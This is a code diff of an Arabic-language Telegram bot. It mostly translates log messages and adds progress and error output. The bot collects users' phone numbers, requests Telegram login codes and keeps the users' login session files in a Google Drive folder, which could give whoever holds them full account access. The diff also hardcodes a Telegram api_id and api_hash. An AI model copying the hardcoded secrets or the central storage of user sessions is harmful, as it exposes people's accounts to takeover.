@@ -105,9 +105,9 @@ async def process_phone(update, context):
     api_id = 26466946
     api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
 
-    # تحقق من وجود ملف الجلسة في Google Drive
+    # التحقق من وجود ملف الجلسة في Google Drive
     try:
-        # ابحث عن ملف الجلسة في Google Drive
+        print("Checking for session file in Google Drive...")
         results = drive_service.files().list(
             q=f"name='session_{user_id}.session' and '{FOLDER_ID}' in parents",
             spaces='drive',
@@ -116,18 +116,19 @@ async def process_phone(update, context):
         items = results.get('files', [])
 
         if items:
-            # تنزيل الملف من Google Drive
+            print("Session file found in Google Drive. Starting download...")
             file_id = items[0]['id']
             request = drive_service.files().get_media(fileId=file_id)
             with open(session_file, "wb") as f:
                 downloader = MediaIoBaseDownload(f, request)
                 done = False
                 while not done:
-                    _, done = downloader.next_chunk()
+                    status, done = downloader.next_chunk()
+                    print(f"Download progress: {status.progress() * 100}%")
 
-            print("تم تنزيل ملف الجلسة من Google Drive.")
-            
-            # تحقق من صلاحيته
+            print("Session file downloaded successfully.")
+
+            # التحقق من صلاحيته
             client = TelegramClient(session_file, api_id, api_hash)
             await client.connect()
             if await client.is_user_authorized():
@@ -138,37 +139,39 @@ async def process_phone(update, context):
                 return FILE  # الانتقال للمرحلة التالية
             else:
                 # إذا كان الملف غير صالح، احذفه
+                print("Session file is invalid. Deleting...")
                 drive_service.files().delete(fileId=file_id).execute()
                 os.remove(session_file)
                 await update.message.reply_text("تم العثور على ملف جلسة تالف في Google Drive وتم حذفه.")
-                print("ملف الجلسة التالف تم حذفه.")
+                print("Invalid session file deleted.")
 
         else:
-            print("لم يتم العثور على ملف جلسة في Google Drive.")
+            print("No session file found in Google Drive.")
     except Exception as e:
-        print(f"حدث خطأ أثناء التحقق من ملف الجلسة: {e}")
-        await update.message.reply_text("حدث خطأ أثناء التحقق من ملف الجلسة.")
-    
+        print(f"Error while checking session file: {e}")
+        await update.message.reply_text(f"حدث خطأ أثناء التحقق من ملف الجلسة: {e}")
+        return PHONE
+
     # إنشاء عميل جديد وإرسال كود التحقق
+    print("No valid session file found. Creating new client...")
     client = TelegramClient(session_file, api_id, api_hash)
     clients[user_id] = client
     phone_numbers[user_id] = phone_number
 
     try:
         await client.connect()
-        print("تم الاتصال بـ Telegram.")
-        
+        print("Connected to Telegram.")
+
         # إرسال كود التحقق
         await client.send_code_request(phone_number)
-        print("تم إرسال رمز التحقق.")
+        print("Verification code sent.")
         await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
         return CODE
 
     except Exception as e:
-        print(f"حدث خطأ أثناء إرسال كود التحقق: {e}")
+        print(f"Error while sending verification code: {e}")
         await update.message.reply_text(f"حدث خطأ: {e}")
         return PHONE
-
 
 
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
